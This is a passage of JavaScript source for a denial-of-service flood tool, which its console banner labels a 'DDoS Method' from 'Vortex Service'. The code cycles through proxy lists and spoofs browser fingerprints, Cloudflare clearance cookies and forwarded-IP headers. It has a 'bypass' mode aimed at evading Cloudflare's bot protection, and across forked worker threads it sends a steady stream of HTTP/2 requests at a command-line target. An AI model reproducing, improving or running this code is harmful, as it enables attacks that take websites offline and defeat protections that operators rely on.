   "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
   "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
   "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
   "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
   "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
   "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
   "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
   "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
   "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
   "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
   "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
   "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
   "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
   "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
   "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
   ];

const site = [
   'cross-site',
 'same-origin',
 'same-site',
 'none'
 ];
 
const mode = [
   'cors',
 'navigate',
 'no-cors',
 'same-origin'
 ];
 
const dest = [
   'document',
 'image',
 'embed',
 'empty',
 'frame',
 'script'
 ];

 const type = [
   "text/plain",
   "text/html",
   "application/json",
   "application/xml",
   "multipart/form-data",
   "application/octet-stream",
   "image/jpeg",
   "image/png",
   "audio/mpeg",
   "video/mp4",
   "application/javascript",
   "application/pdf",
   "application/vnd.ms-excel",
   "application/vnd.ms-powerpoint",
   "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
   "application/vnd.openxmlformats-officedocument.presentationml.presentation",
   "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
   "application/zip",
   "image/gif",
   "image/bmp",
   "image/tiff",
   "audio/wav",
   "audio/midi",
   "video/avi",
   "video/mpeg",
   "video/quicktime",
   "text/csv",
   "text/xml",
   "text/css",
   "text/javascript",
   "application/graphql",
   "application/x-www-form-urlencoded",
   "application/vnd.api+json",
   "application/ld+json",
   "application/x-pkcs12",
   "application/x-pkcs7-certificates",
   "application/x-pkcs7-certreqresp",
   "application/x-pem-file",
   "application/x-x509-ca-cert",
   "application/x-x509-user-cert",
   "application/x-x509-server-cert",
   "application/x-bzip",
   "application/x-gzip",
   "application/x-7z-compressed",
   "application/x-rar-compressed",
   "application/x-shockwave-flash"
  ];
  
function generateUA(count) {
    const userAgents = [];

    for (let i = 0; i < count; i++) {
        const userAgent = randomUseragent.getRandom();
        userAgents.push(userAgent);
    }

    return userAgents;
}

const count = 1000;
const userAgents = generateUA(count);

const uap = userAgents.map(ua => `'${ua}',`);

  const Methods = [
   "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"
 ];
 function getRandomInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 const browserVersion = getRandomInt(120, 123);
 const fwfw = ['Google Chrome', 'Brave'];
const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
       ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
       : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
   
const secGpcValue = isBrave ? "1" : undefined;
 let brandValue;
     if (browserVersion === 120) {
         brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
     } 
     else if (browserVersion === 121) {
         brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
     }
     else if (browserVersion === 122) {
         brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
     }
     else if (browserVersion === 123) {
         brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
     }
     const secChUa = `${brandValue}`;

function ememmmmmemmeme(minLength, maxLength) {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  let result = '';
  for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      result += characters[randomIndex];
  }
  return result;
}
const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6,6) + ".net" : refererValue;
var proxies = readLines(proxyFile);
const parsedTarget = url.parse(target);
var randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var platform1 = platform[Math.floor(Math.random() * platform.length)];
var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
var CookieCf = cookie1[Math.floor(Math.random() * cookie1.length)];
var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
var type1 = type[Math.floor(Math.floor(Math.random() * type.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);


     if (cluster.isMaster) {
     console.log(`

                      █░█ █▀█ █▀█ ▀█▀ █▀▀ ▀▄▀
                      ▀▄▀ █▄█ █▀▄ ░█░ ██▄ █░█
             ╚╦════════════════════════════════════════╦╝
           ╔══╩════════════════════════════════════════╩═══╗
             DDoS Method Development By t.me/Vortex Service 
           ╚══╦═════════════════════════════════════════╦══╝
                    By t.me/Lintar21 And t.me/baidaja
              ╚═════════════════════════════════════════╝
              
`);
       console.log("[Vortex] Website/Target: " + process.argv[2]);
       console.log("[Vortex] Times: "+ process.argv[3]);
       console.log("[Vortex] Rate: "+ process.argv[4]);
       console.log("[Vortex] Threads: "+ process.argv[5]);
       console.log("[Vortex] ProxyFile: "+ process.argv[6]);
       console.log(" ")
       for (let counter = 1; counter <= threads; counter++) {
       	console.log(`[Vortex] Operate ${counter}`);
         cluster.fork();
       }
     } else {
       setInterval(runFlooder);
     };

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}

const rateHeaders = [
 { "akamai-origin-hop": randstr(5)  },
 { "source-ip": randstr(5)  },
 { "via": randstr(5)  },
 { "cluster-ip": randstr(5)  },
 {"Access-Control-Request-Method": "GET", randomMethod},
 {"dnt" : "1" },
 ];
 const rateHeaders2 = [
 { "akamai-origin-hop": randstr(5)  },
 { "source-ip": randstr(5)  },
 { "via": randstr(5)  },
 { "cluster-ip": randstr(5)  },
 ];

const Socker = new NetSocket();
headers[":method"] = "GET", randomMethod, randomMethod;
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["user-agent"] = uap1;
headers["x-forwarded-proto"] = "https", "http";
headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["pragma"] = randomHeaders['pragma'];
headers["vary"] = randomHeaders['vary'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["Sec-Websocket-Key"] = spoofed;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["Client-IP"] = proxies;
headers["Real-IP"] = proxies;
headers["cache-control"] = control;
headers["sec-ch-ua"] = secChUa;
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = platform1;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = acceptHeaderValue;
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-mode"] = mode1;
headers["sec-fetch-site"] = site1;
headers["TE"] = "trailers";
headers["Content-Type"] = type1;
headers['cf-cache-status'] = "BYPASS", "HIT", "DYNAMIC";
headers["sec-gpc"] = secGpcValue;
headers["cdn-loop"] = "cloudflare", "google";
headers["CF-Connecting-IP"] = spoofed;
headers["CF-RAY"] = "randomRayValue";
headers["CF-Visitor"] = "{'scheme':'https'}";
headers["referer"] = currentRefererValue;
headers["cookie"] = CookieCf, `cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
headers["DNT"] = '1';
headers["x-requested-with"] = "XMLHttpRequest";
headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
    
  let interval
   if (input === 'flood') {
 interval = 1000;
}
else if (input === 'bypass') {
 function randomDelay(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 interval = randomDelay(1000, 5000);
}

 headers["origin"] = "https://" + parsedTarget.host;
 headers[":authority"] = parsedTarget.host
 headers["user-agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
           host: parsedTarget.host,
           ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
           sigals: siga,
           socket: connection,
           challengesToSolve: Infinity,
           resolveWithFullResponse: true,
           followAllRedirects: true,
           maxRedirects: 2,
           clientTimeout: 5000,
           clientlareMaxTimeout: 10000,
           cloudflareTimeout: 5000,
           cloudflareMaxTimeout: 30000,
           ciphers: tls.getCiphers().join(":") + cipper,
           ecdhCurve: "prime256v1:X25519",
           rejectUnauthorized: false,
           secure: true,
           Compression: false,
           rejectUnauthorized: false,
           port: 443,
           servername: parsedTarget.host,
           sessionTimeout: 5000,
           secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
       };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
           headerTableSize: 65536,
           maxConcurrentStreams: 2000,
           initialWindowSize: 65535,
           maxHeaderListSize: 65536,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 2000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 65536,
           enablePush: false
         });

        client.on("connect", () => {
          const IntervalAttack = setInterval(() => {
             const dynHeaders = {
               ...headers,
               ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
               ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
             };
               for (let i = 0; i < Rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                     if (response['set-cookie']) {
                       headers["cookie"] = cookieString(scp.parse(response["set-cookie"]))
                   }
                     request.close();
                       request.destroy();
                       return
                   });
   
                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
    }),function (error, response, body) {
   };
}
const KillScript = () => process.exit(1);
setTimeout(KillScript, time * 1000);
